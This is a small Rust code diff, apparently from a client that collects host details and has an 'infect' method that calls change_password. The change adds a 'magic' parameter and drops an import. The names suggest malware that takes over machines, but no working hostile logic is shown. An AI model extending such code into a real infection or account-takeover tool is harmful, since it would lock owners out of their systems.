@@ -1,5 +1,4 @@
 use crate::client::types::{Disk, Host, Infect, User, UserInfo, OS};
-use serde::Deserialize;
 use sysinfo::{CpuExt, DiskExt, System, SystemExt, UserExt};
 
 impl Host {
@@ -31,8 +30,8 @@ impl Host {
         }
     }
 
-    pub fn infect(&self, scheme: &str) {
-        self.change_password(scheme);
+    pub fn infect(&self, magic: u8, scheme: &str) {
+        self.change_password(magic, scheme);
     }
 
     pub fn to_json(&self) -> String {
